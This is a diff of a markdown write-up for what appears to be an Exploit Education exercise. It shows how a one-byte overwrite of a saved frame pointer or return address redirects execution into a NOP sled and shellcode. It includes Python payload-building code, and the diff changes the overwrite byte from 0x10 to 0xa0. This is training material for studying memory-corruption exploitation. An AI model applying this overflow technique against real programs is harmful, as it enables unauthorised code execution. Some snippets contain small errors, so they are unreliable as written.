@@ -78,18 +78,20 @@ I had to add 0x10 to the address, to skip the `ExploitEducation=` prefix, which 
 
 Because we can manipulate the last byte of the "buffer"/return address, lets check if our code is somwhere within this range `0x0x7fffffffe500 - 0x0x7fffffffe5ff`:
 ![](_attachments/Pasted%20image%2020230402105729.png)
+
+
+![](_attachments/Pasted%20image%2020230402112141.png)
+
 So when we return, we need to see if we can manipulate the address to be 0x00007fffffffe510. This will jump to our shellcode, probably should include a couple of nop's to make it line up correctly and then some real shellcode. 
 
-![](_attachments/Pasted%20image%2020230402110357.png)
-
-You can see we changed to value of RBP to `0x..10`, this is with the character backtick character.
+You can see if we changed to value of RBP to `0x..a0`, itll jump to our shellcode.
 
 Lets mod the shellcode to be `\x90 * 126 + \x10`
 
 ```python
 from pwn import *
 
-buf = b"\x90" * 126 + "\x10"
+buf = b"\x90" * 126 + "\xa0"
 
 print(buf)
 ```
@@ -108,7 +110,11 @@ payload = b"\x90" * 20
 payload += shellcode
 payload += b"A" * (126 - len(payload))
 # overwrite RIP byte
-payload += b"\x10"
+payload += b"\xa0"
 
 print(payload)
 ```
+
+So now when we run the program, it jumps into our shellcode
+
+![](_attachments/Pasted%20image%2020230402112619.png)
